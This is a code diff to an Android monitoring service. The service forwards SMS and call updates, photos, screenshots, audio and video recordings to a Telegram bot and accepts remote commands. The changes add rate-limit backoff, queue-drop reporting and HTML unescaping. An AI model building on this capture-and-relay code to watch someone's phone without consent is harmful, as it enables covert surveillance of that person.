@@ -168,6 +168,14 @@ class MonitoringService : Service() {
                 refreshCreds()
                 if (key == PreferencesManager.KEY_BOT_TOKEN) {
                     try {
+                        synchronized(handledUpdateIds) { handledUpdateIds.clear() }
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        synchronized(handledCallbackIds) { handledCallbackIds.clear() }
+                    } catch (_: Exception) {
+                    }
+                    try {
                         serviceScope.launch { registerBotCommands() }
                     } catch (_: Exception) {
                     }
@@ -1419,11 +1427,17 @@ class MonitoringService : Service() {
             }
             "/clearqueue" -> {
                 val queued = messageQueue.getQueueSize()
+                val overflowTaken = try { messageQueue.takeOverflowDrops() } catch (_: Exception) { 0L }
+                val expiredTaken = try { messageQueue.takeExpiredDrops() } catch (_: Exception) { 0L }
                 try {
                     messageQueue.clearQueue()
                 } catch (_: Exception) {
                 }
-                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.", null, true)
+                val dropExtra = buildString {
+                    if (overflowTaken > 0L) append(" Plus $overflowTaken overflow drop(s) discarded.")
+                    if (expiredTaken > 0L) append(" Plus $expiredTaken expired drop(s) discarded.")
+                }
+                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.$dropExtra", null, true)
             }
             "/lock" -> {
                 try {
@@ -2531,7 +2545,7 @@ class MonitoringService : Service() {
                     }
                     return false
                 }
-                val plain = message.replace(TAG_STRIP_REGEX, "")
+                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
                 if (plain != message) {
                     try {
                         val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
@@ -2807,6 +2821,14 @@ class MonitoringService : Service() {
             }
             return
         }
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("Rate limited, photo delayed for retry.")
+                }
+            }
+            return
+        }
         if (pendingPhotoCount() >= 10) {
             try {
                 prunePhotoCache(9)
@@ -2953,6 +2975,14 @@ class MonitoringService : Service() {
             serviceScope.launch {
                 if (reportResult) {
                     sendToTelegram("Auth rejected, screenshot delayed until the token is fixed in Setup.")
+                }
+            }
+            return
+        }
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("Rate limited, screenshot delayed for retry.")
                 }
             }
             return
@@ -3448,6 +3478,10 @@ class MonitoringService : Service() {
 
     @Suppress("DEPRECATION")
     private suspend fun recordAndSendAudio(seconds: Int) {
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
+            sendToTelegram("Rate limited, audio delayed for retry.")
+            return
+        }
         ensureForegroundTypes()
         val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
@@ -3600,6 +3634,13 @@ class MonitoringService : Service() {
             recordBusy.set(false)
             serviceScope.launch {
                 sendToTelegram("Auth rejected, video delayed until the token is fixed in Setup.")
+            }
+            return
+        }
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
+            recordBusy.set(false)
+            serviceScope.launch {
+                sendToTelegram("Rate limited, video delayed for retry.")
             }
             return
         }
